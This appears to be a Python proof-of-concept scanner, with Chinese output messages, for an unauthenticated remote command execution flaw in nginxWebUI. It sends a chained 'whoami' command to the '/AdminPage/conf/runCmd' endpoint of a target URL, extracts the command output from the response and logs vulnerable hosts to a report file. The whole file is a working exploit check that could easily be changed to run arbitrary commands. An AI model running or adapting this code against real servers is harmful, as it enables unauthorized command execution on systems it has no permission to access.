import re

import requests
import time
import buter
import wirtefile

filename = "./reps/nginxWebUI前台远程命令执行-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc = "/AdminPage/conf/runCmd?cmd=whoami%26%26echo%20nginx"

def nginxWebuiRCE(url):
    try:
        reps = requests.get(url=url+poc, headers=headers, verify=False, timeout=5)
        command = re.findall('<br>运行失败<br>(.*?)<br>nginx<br>"}', reps.text)
        if reps.status_code == 200 and '运行失败' in reps.text and len(command) >= 1 :

            print(buter.colors.GREEN+  f"存在nginxWebUI前台远程命令执行 url : {url} response_whoami : {command}" + buter.colors.END)
            reptext = reps.url
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现nginxWebUI前台远程命令执行 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
